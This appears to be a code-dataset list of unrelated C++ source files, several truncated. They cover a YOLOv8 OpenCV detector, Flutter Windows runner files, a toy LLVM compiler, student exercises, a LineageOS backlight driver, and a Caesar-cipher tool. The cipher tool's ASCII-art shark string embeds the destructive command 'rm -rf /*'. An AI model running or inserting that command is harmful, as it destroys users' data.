    "#include <fstream>\r\n#include <opencv2/core/mat.hpp>\r\n#include <opencv2/opencv.hpp>\r\nusing namespace std;\r\nusing namespace cv;\r\nusing namespace cv::dnn;\r\n/******************************************************************************************************************/\r\nconst float INPUT_WIDTH = 640.0;\r\nconst float INPUT_HEIGHT = 480.0;\r\nconst float SCORE_THRESHOLD = 0.45;\r\nconst float NMS_THRESHOLD = 0.5;\r\nconst float CONFIDENCE_THRESHOLD = 0.25;\r\n\r\n// Text parameters.\r\nconst float FONT_SCALE = 0.7;\r\nconst int FONT_FACE = FONT_HERSHEY_SIMPLEX;\r\nconst int THICKNESS = 1;\r\n\r\n// Colors.\r\n//const std::vector<cv::Scalar> colors = { cv::Scalar(255, 255, 0), cv::Scalar(0, 255, 0), cv::Scalar(0, 255, 255), cv::Scalar(255, 0, 0) };\r\nScalar BLACK = Scalar(0, 0, 0);\r\nScalar BLUE = Scalar(255, 178, 50);\r\nScalar YELLOW = Scalar(0, 255, 255);\r\nScalar RED = Scalar(0, 0, 255);\r\n/******************************************************************************************************************/\r\nvoid draw_label(Mat& input_image, string label, int left, int top)\r\n{\r\n    // Display the label at the top of the bounding box.\r\n    int baseLine;\r\n    Size label_size = getTextSize(label, FONT_FACE, FONT_SCALE, THICKNESS, &baseLine);\r\n    top = max(top, label_size.height);\r\n    // Top left corner.\r\n    Point tlc = Point(left, top);\r\n    // Bottom right corner.\r\n    Point brc = Point(left + label_size.width, top + label_size.height + baseLine);\r\n    // Draw white rectangle.\r\n    rectangle(input_image, tlc, brc, BLACK, FILLED);\r\n    // Put the label on the black rectangle.\r\n    putText(input_image, label, Point(left, top + label_size.height), FONT_FACE, FONT_SCALE, YELLOW, THICKNESS);\r\n}\r\n/******************************************************************************************************************/\r\nstd::vector<std::string> load_class_list()\r\n{\r\n    std::vector<std::string> class_list;\r\n    std::ifstream ifs(\"classes.txt\");\r\n    std::string line;\r\n    while (getline(ifs, line))\r\n    {\r\n        class_list.push_back(line);\r\n    }\r\n    return class_list;\r\n}\r\n/******************************************************************************************************************/\r\nvoid load_net(cv::dnn::Net& net, bool is_cuda)\r\n{\r\n    auto result = cv::dnn::readNet(\"yolov8s.onnx\");\r\n\r\n    if (is_cuda)\r\n    {\r\n        std::cout << \"Running on GPU using CUDA\\n\";\r\n        result.setPreferableBackend(cv::dnn::DNN_BACKEND_CUDA);\r\n        result.setPreferableTarget(cv::dnn::DNN_TARGET_CUDA_FP16);\r\n    }\r\n    else\r\n    {\r\n        std::cout << \"Running on CPU\\n\";\r\n        result.setPreferableBackend(cv::dnn::DNN_BACKEND_OPENCV);\r\n        result.setPreferableTarget(cv::dnn::DNN_TARGET_CPU);\r\n    }\r\n    net = result;\r\n}\r\n\r\n/******************************************************************************************************************/\r\nvector<Mat> pre_process(Mat& input_image, Net& net)\r\n{\r\n    //Convert to blob.\r\n    Mat blob;\r\n    blobFromImage(input_image, blob, 1. / 255., Size(INPUT_WIDTH, INPUT_HEIGHT), Scalar(), true, false);\r\n    net.setInput(blob);\r\n    vector<Mat> outputs;\r\n    if (!blob.empty()) \r\n\t{\r\n        net.forward(outputs, net.getUnconnectedOutLayersNames());\r\n    }\r\n\r\n    return outputs;\r\n}\r\n/******************************************************************************************************************/\r\nMat post_process(Mat& input_image, vector<Mat>& outputs, const vector<string>& class_name)\r\n{\r\n    // Initialize vectors to hold respective outputs while unwrapping     detections.\r\n    vector<int> class_ids;\r\n    vector<float> confidences;\r\n    vector<Rect> boxes;\r\n\r\n    int rows = outputs[0].size[2];\r\n    int dimensions = outputs[0].size[1];\r\n\r\n    outputs[0] = outputs[0].reshape(1, dimensions);\r\n    cv::transpose(outputs[0], outputs[0]);\r\n\r\n    float* data = (float*)outputs[0].data;\r\n\r\n    // Resizing factor.\r\n    float x_factor = input_image.cols / INPUT_WIDTH;\r\n    float y_factor = input_image.rows / INPUT_HEIGHT;\r\n\r\n    // Iterate through  detections.\r\n    //cout << \"num detections  : \" << rows << \" \" << dimensions << endl;\r\n    for (int i = 0; i < rows; ++i)\r\n    {\r\n        float* classes_scores = data + 4;\r\n\r\n        cv::Mat scores(1, class_name.size(), CV_32FC1, classes_scores);\r\n        cv::Point class_id;\r\n        double maxClassScore;\r\n\r\n        minMaxLoc(scores, 0, &maxClassScore, 0, &class_id);\r\n\r\n        if (maxClassScore > SCORE_THRESHOLD)\r\n        {\r\n            confidences.push_back(maxClassScore);\r\n            class_ids.push_back(class_id.x);\r\n\r\n            float x = data[0];\r\n            float y = data[1];\r\n            float w = data[2];\r\n            float h = data[3];\r\n\r\n            int left = int((x - 0.5 * w) * x_factor);\r\n            int top = int((y - 0.5 * h) * y_factor);\r\n\r\n            int width = int(w * x_factor);\r\n            int height = int(h * y_factor);\r\n\r\n            boxes.push_back(cv::Rect(left, top, width, height));\r\n        }\r\n\r\n        data += dimensions;\r\n    }\r\n    // Perform Non-Maxi",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"node.h\"\n#include \"codegen.h\"\n#include \"parser.hpp\"\n\nusing namespace std;\n\n/* Compile the AST into a module */\nvoid CodeGenContext::generateCode(NBlock& root)\n{\n\tstd::cout << \"Generating code...\\n\";\n\t\n\t/* Create the top level interpreter function to call as entry */\n\tvector<Type*> argTypes;\n\tFunctionType *ftype = FunctionType::get(Type::getVoidTy(MyContext), makeArrayRef(argTypes), false);\n\tmainFunction = Function::Create(ftype, GlobalValue::InternalLinkage, \"main\", module);\n\tBasicBlock *bblock = BasicBlock::Create(MyContext, \"entry\", mainFunction, 0);\n\t\n\t/* Push a new variable/block context */\n\tpushBlock(bblock);\n\troot.codeGen(*this); /* emit bytecode for the toplevel block */\n\tReturnInst::Create(MyContext, bblock);\n\tpopBlock();\n\t\n\t/* Print the bytecode in a human-readable format \n\t   to see if our program compiled properly\n\t */\n\tstd::cout << \"Code is generated.\\n\";\n\t// module->dump();\n\n\tlegacy::PassManager pm;\n\t// TODO:\n\tpm.add(createPrintModulePass(outs()));\n\tpm.run(*module);\n}\n\n/* Executes the AST by running the main function */\nGenericValue CodeGenContext::runCode() {\n\tstd::cout << \"Running code...\\n\";\n\tExecutionEngine *ee = EngineBuilder( unique_ptr<Module>(module) ).create();\n\tee->finalizeObject();\n\tvector<GenericValue> noargs;\n\tGenericValue v = ee->runFunction(mainFunction, noargs);\n\tstd::cout << \"Code was run.\\n\";\n\treturn v;\n}\n\n/* Returns an LLVM type based on the identifier */\nstatic Type *typeOf(const NIdentifier& type) \n{\n\tif (type.name.compare(\"int\") == 0) {\n\t\treturn Type::getInt64Ty(MyContext);\n\t}\n\telse if (type.name.compare(\"double\") == 0) {\n\t\treturn Type::getDoubleTy(MyContext);\n\t}\n\treturn Type::getVoidTy(MyContext);\n}\n\n/* -- Code Generation -- */\n\nValue* NInteger::codeGen(CodeGenContext& context)\n{\n\tstd::cout << \"Creating integer: \" << value << endl;\n\treturn ConstantInt::get(Type::getInt64Ty(MyContext), value, true);\n}\n\nValue* NDouble::codeGen(CodeGenContext& context)\n{\n\tstd::cout << \"Creating double: \" << value << endl;\n\treturn ConstantFP::get(Type::getDoubleTy(MyContext), value);\n}\n\nValue* NIdentifier::codeGen(CodeGenContext& context)\n{\n\tstd::cout << \"Creating identifier reference: \" << name << endl;\n\tif (context.locals().find(name) == context.locals().end()) {\n\t\tstd::cerr << \"undeclared variable \" << name << endl;\n\t\treturn NULL;\n\t}\n\n\t// return nullptr;  \n\treturn new LoadInst(context.locals()[name]->getType(),context.locals()[name], name, false, context.currentBlock());\n}\n\nValue* NMethodCall::codeGen(CodeGenContext& context)\n{\n\tFunction *function = context.module->getFunction(id.name.c_str());\n\tif (function == NULL) {\n\t\tstd::cerr << \"no such function \" << id.name << endl;\n\t}\n\tstd::vector<Value*> args;\n\tExpressionList::const_iterator it;\n\tfor (it = arguments.begin(); it != arguments.end(); it++) {\n\t\targs.push_back((**it).codeGen(context));\n\t}\n\tCallInst *call = CallInst::Create(function, makeArrayRef(args), \"\", context.currentBlock());\n\tstd::cout << \"Creating method call: \" << id.name << endl;\n\treturn call;\n}\n\nValue* NBinaryOperator::codeGen(CodeGenContext& context)\n{\n\n\tstd::cout << \"Creating binary operation \" << op << endl;\n\tInstruction::BinaryOps instr;\n\tswitch (op) {\n\t\tcase TPLUS: \tinstr = Instruction::Add; goto math;\n\t\tcase TMINUS: \tinstr = Instruction::Sub; goto math;\n\t\tcase TMUL: \t\tinstr = Instruction::Mul; goto math;\n\t\tcase TDIV: \t\tinstr = Instruction::SDiv; goto math;\n\t\tcase TMOD: \t\tinstr = Instruction::URem; goto math;\n\t\t\t\t\n\t\t// case TCEQ       instr = Instruction::\n\t}\n\treturn NULL;\nmath:\n\treturn BinaryOperator::Create(instr, lhs.codeGen(context), \n\t\trhs.codeGen(context), \"\", context.currentBlock());\n}\n\nValue* NAssignment::codeGen(CodeGenContext& context)\n{\n\tstd::cout << \"Creating assignment for \" << lhs.name << endl;\n\tif (context.locals().find(lhs.name) == context.locals().end()) {\n\t\tstd::cerr << \"undeclared variable \" << lhs.name << endl;\n\t\treturn NULL;\n\t}\n\treturn new StoreInst(rhs.codeGen(context), context.locals()[lhs.name], false, context.currentBlock());\n}\n\nValue* NBlock::codeGen(CodeGenContext& context)\n{\n\tStatementList::const_iterator it;\n\tValue *last = NULL;\n\tfor (it = statements.begin(); it != statements.end(); it++) {\n\t\tstd::cout << \"Generating code for \" << typeid(*it).name() << endl;\n\t\tlast = (**it).codeGen(context);\n\t}\n\tstd::cout << \"Creating block\" << endl;\n\treturn last;\n}\n\nValue* NExpressionStatement::codeGen(CodeGenContext& context)\n{\n\tstd::cout << \"Generating code for \" << typeid(expression).name() << endl;\n\treturn expression.codeGen(context);\n}\n\nValue* NReturnStatement::codeGen(CodeGenContext& context)\n{\n\tstd::cout << \"Generating return code for \" << typeid(expression).name() << endl;\n\tValue *returnValue = expression.codeGen(context);\n\tcontext.setCurrentReturnValue(returnValue);\n\treturn returnValue;\n}\n\nValue* NVariableDeclaration::codeGen(CodeGenContext& context)\n{\n\tstd::cout << \"Creating variable declaration \" << type.name << \" \" << id.name << endl;\n\tAllocaInst *alloc = new AllocaInst(typeOf(type),4, id.name.c_str(), context.currentBlock());\n\tcontext.l",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\nstruct node // Node Declaration\n{\n    string label;\n    int ch_count;\n    struct node *child[10];\n} *root;\n\nclass GT // Class Declaration\n{\npublic:\n    void create_tree();\n    void display(node *r1);\n\n    GT()\n    {\n        root = NULL;\n    }\n};\n\nvoid GT::create_tree()\n{\n    int tchapters;\n    root = new node;\n    cout << \"Enter name of book : \";\n    cin.ignore();\n    getline(cin, root->label);\n    cout << \"Enter number of chapters in book : \";\n    cin >> tchapters;\n    root->ch_count = tchapters;\n    for (int i = 0; i < tchapters; i++)\n    {\n        root->child[i] = new node;\n        cout << \"Enter the name of Chapter \" << i + 1 << \" : \";\n        cin.ignore();\n        getline(cin, root->child[i]->label);\n        cout << \"Enter number of sections in Chapter : \" << root->child[i]->label << \" : \";\n        cin >> root->child[i]->ch_count;\n        for (int j = 0; j < root->child[i]->ch_count; j++)\n        {\n            root->child[i]->child[j] = new node;\n            cout << \"Enter Name of Section \" << j + 1 << \" : \";\n            cin.ignore();\n            getline(cin, root->child[i]->child[j]->label);\n        }\n    }\n}\n\nvoid GT::display(node *r1)\n{\n    if (r1 != NULL)\n    {\n        cout << \"\\n-----Book Hierarchy---\" << endl;\n        cout << \"Book title : \" << r1->label << endl;\n        int tchapters = r1->ch_count;\n        for (int i = 0; i < tchapters; i++)\n        {\n            cout << \"\\nChapter \" << i + 1 << \" : \" << r1->child[i]->label << endl;\n            cout << \"Sections : \";\n            for (int j = 0; j < r1->child[i]->ch_count; j++)\n            {\n                cout << \"\\n\" << r1->child[i]->child[j]->label;\n            }\n            cout << endl;\n        }\n    }\n}\n\nint main()\n{\n    int choice;\n    GT gt;\n    while (true)\n    {\n        cout << \"-----------------\" << endl;\n        cout << \"Book Tree Creation\" << endl;\n        cout << \"-----------------\" << endl;\n        cout << \"1.Create\" << endl;\n        cout << \"2.Display\" << endl;\n        cout << \"3.Quit\" << endl;\n        cout << \"Enter your choice : \";\n        cin >> choice;\n        switch (choice)\n        {\n        case 1:\n            gt.create_tree();\n            break;\n        case 2:\n            gt.display(root);\n            break;\n        case 3:\n            cout << \"Thanks for using this program!!!\";\n            exit(0);\n        default:\n            cout << \"Wrong choice!!!\" << endl;\n        }\n    }\n    return 0;\n}\n\n",
    "/*\n * Copyright (C) 2022 The LineageOS Project\n *\n * SPDX-License-Identifier: Apache-2.0\n */\n\n#include \"Backlight.h\"\n\n#include \"LED.h\"\n\nnamespace aidl {\nnamespace android {\nnamespace hardware {\nnamespace light {\n\nclass BacklightBrightness : public BacklightDevice {\n  public:\n    BacklightBrightness(std::string name) : mBasePath(mkBacklightBasePath + name + \"/\") {\n        if (!readFromFile(mBasePath + \"max_brightness\", &mMaxBrightness)) {\n            mMaxBrightness = kDefaultMaxBrightness;\n        }\n    };\n\n    void setBacklight(uint8_t value) {\n        writeToFile(mBasePath + \"brightness\", value * mMaxBrightness / 0xFF);\n    }\n\n    bool exists() { return fileWriteable(mBasePath + \"brightness\"); }\n\n  private:\n    std::string mBasePath;\n    uint32_t mMaxBrightness;\n\n    inline static const std::string mkBacklightBasePath = \"/sys/class/backlight/\";\n    inline static const uint32_t kDefaultMaxBrightness = 255;\n};\n\nclass LEDBacklight : public BacklightDevice {\n  public:\n    LEDBacklight(std::string type) : mLED(type){};\n\n    void setBacklight(uint8_t value) { mLED.setBrightness(value); }\n\n    bool exists() { return mLED.exists(); }\n\n  private:\n    LED mLED;\n};\n\nstatic const std::string kBacklightDevices[] = {\n        \"backlight\",\n        \"panel0-backlight\",\n};\n\nstatic const std::string kLedDevices[] = {\n        \"lcd-backlight\",\n};\n\nBacklightDevice* getBacklightDevice() {\n    for (auto& device : kBacklightDevices) {\n        auto backlight = new BacklightBrightness(device);\n        if (backlight->exists()) {\n            return backlight;\n        }\n        delete backlight;\n    }\n\n    for (auto& device : kLedDevices) {\n        auto backlight = new LEDBacklight(device);\n        if (backlight->exists()) {\n            return backlight;\n        }\n        delete backlight;\n    }\n\n    return nullptr;\n}\n\n}  // namespace light\n}  // namespace hardware\n}  // namespace android\n}  // namespace aidl\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <functional>\n#include <iomanip>\n\nclass Article {\npublic:\n    Article(int Id, double price, int qte_stock)\n            : Id(Id), price(price), qte_stock(qte_stock) {}\n\n    int getId() const { return Id; }\n    double getPrice() const { return price; }\n    int getqte_stock() const { return qte_stock; }\n\n    void setqte_stock(int quantity) { qte_stock = quantity; }\n\nprivate:\n    int Id;\n    double price;\n    int qte_stock;\n};\n\nclass Panier {\npublic:\n    void addItem(const Article& article, int quantity) {\n        items.push_back(std::make_pair(article, quantity));\n    }\n\n    void removeItem(int articleId) {\n        items.erase(std::remove_if(items.begin(), items.end(),\n                                   [articleId](const std::pair<Article, int>& item) {\n                                       return item.first.getId() == articleId;\n                                   }), items.end());\n    }\n\n    void modifyQuantity(int articleId, int newQuantity) {\n        for (auto& item : items) {\n            if (item.first.getId() == articleId) {\n                item.second = newQuantity;\n                break;\n            }\n        }\n    }\n\n    void clear() {\n        items.clear();\n    }\n\n    const std::vector<std::pair<Article, int>>& getItems() const {\n        return items;\n    }\n\nprivate:\n    std::vector<std::pair<Article, int>> items;\n};\n\nclass Client {\npublic:\n    Client(const std::string& name, const std::string& email)\n            : name_(name), email_(email) {}\n\n    const std::string& name() const { return name_; }\n    const std::string& email() const { return email_; }\n\nprivate:\n    std::string name_;\n    std::string email_;\n};\n\nclass Commande : public Client {\npublic:\n    Commande(const std::string& name, const std::string& email)\n            : Client(name, email), cart_() {}\n\n    Panier& cart() { return cart_; }\n\nprivate:\n    Panier cart_;\n};\n\n// Function to calculate the total order amount with discounts\ndouble calculateTotal(const Panier& cart) {\n    double total = 0;\n    for (const auto& item : cart.getItems()) {\n        const Article& article = item.first;\n        int quantity = item.second;\n        double price = article.getPrice();\n        // Apply discount if quantity exceeds 10 units\n        if (quantity > 10) {\n            price *= 0.8; // 20% discount\n        }\n        total += price * quantity;\n    }\n    return total;\n}\n\n// Function to display the contents of the shopping cart\nvoid displayCart(const Panier& cart) {\n    std::cout << \"  ID   QTE   PRICE      NAME\\n\";\n    std::cout << \"-------------------------------\\n\";\n    for (const auto& item : cart.getItems()) {\n        const Article& article = item.first;\n        int quantity = item.second;\n        std::cout << std::setw(4) << article.getId() << std::setw(6) << quantity << std::setw(9) << article.getPrice() << \"$\"\n                  << std::setw(10) << \"Article Name\" << \"\\n\";\n    }\n    std::cout << \"-------------------------------\\n\";\n}\n\n// Main function\nint main() {\n    std::string name, email;\n    std::cout << \"Bonjour to Emsi store!\" << std::endl;\n    std::cout << \"Enter your name: \";\n    std::getline(std::cin, name);\n    std::cout << \"Enter your email: \";\n    std::getline(std::cin, email);\n\n    Commande order(name, email);\n\n    char choice;\n    do {\n        std::cout << \"Voici votre panier virtuel:\\n\";\n        displayCart(order.cart());\n        std::cout << \"[A] Ajouter un article\\n\"\n                     \"[B] Supprimer un article\\n\"\n                     \"[C] Modifier quantite\\n\"\n                     \"[D] Afficher tous les articles en ordre croissant\\n\"\n                     \"[E] Montant total du commande avec remises\\n\"\n                     \"[F] Article plus cher du panier\\n\"\n                     \"[G] Articles compris entre prix (min - max)\\n\"\n                     \"[H] Article command\u00e9 (details)\\n\"\n                     \"[I] Vider panier\\n\"\n                     \"Enter your choice: \";\n        std::cin >> choice;\n        std::cin.ignore(); // Ignore the newline character\n        // Perform actions based on choice\n        switch (choice) {\n            case 'A':\n                // Add item to cart\n                // Implement this functionality\n                break;\n            case 'B':\n                // Remove item from cart\n                // Implement this functionality\n                break;\n            case 'C':\n                // Modify quantity of item in cart\n                // Implement this functionality\n                break;\n            case 'D':\n                // Display all items in ascending order by price\n                // Implement this functionality\n                break;\n            case 'E':\n                // Display total order amount with discounts\n                std::cout << \"Total order amount with discounts: $\" << calculateTotal(order.cart()) << std::endl;\n                break;\n            case 'F':\n                // Display the most expensive item in th",
    "#include \"CaesarSub.h\"\r\n\r\n#include <algorithm>\r\n#include <vector>\r\n#include <iostream>\r\n#include <cstdlib>\r\n#include <cmath>\r\n\r\nusing namespace std;\r\n\r\nint main(int argc, char* argv[]) {\r\n\tif ((argc < 3) || (argc > 4)) {\r\n\t\tcout << \"Usage: \" << argv[0] << \" <corpus_filename> <ciphertext> [num_iterations]\" << endl;\r\n\t\treturn -1;\r\n\t}\t\r\n\tstring shark = \"\\n                                 ,-\\n                               ,'::|\\n                              /::::|\\n                            ,'::::o\\\\    \\t                          _.. \\n         ____........-------rm -rf /*    \\t\\t               ,-' /\\n _.--\\\"\\\"\\\"\\\". . . .      .   .  .  .  \\\"\\\"`-._                           ,-' .;'\\n<. - :::::o......  ...   . . .. . .  .  .\\\"\\\"--._                  ,-'. .;'\\n `-._  ` `\\\":`:`:`::||||:::::::::::::::::.:. .  \\\"\\\"--._ ,'|     ,-'.  .;'\\n     \\\"\\\"\\\"_=--       //'{};.. ````:`:`::::::::::.:.:.:. .`-`._-'.   .;'\\n         \\\"\\\"--.__     \\\\(       \\\\               ` ``:`:``:::: .   .;'\\n                \\\"\\\\\\\"\\\"--.:-.     `.                             